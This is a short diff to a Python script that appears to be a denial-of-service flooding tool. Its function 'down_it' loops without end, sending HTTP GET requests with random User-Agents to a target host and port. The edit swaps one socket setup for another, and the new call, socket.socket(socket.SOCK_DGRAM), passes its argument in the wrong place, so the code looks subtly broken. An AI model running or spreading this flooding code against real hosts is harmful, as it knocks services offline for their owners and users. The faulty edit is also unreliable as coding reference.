@@ -152,8 +152,7 @@ def down_it(item):
 		while True:
 			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			sock = socket.socket(socket.SOCK_DGRAM)
-			bytes = random._urandom(1490)
+			s = socket.socket(socket.SOCK_DGRAM)
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
@@ -255,8 +254,7 @@ if __name__ == '__main__':
 	time.sleep(5)
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		sock = socket.socket(socket.SOCK_DGRAM)
-		bytes = random._urandom(1490)
+		s = socket.socket(socket.SOCK_DGRAM)
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
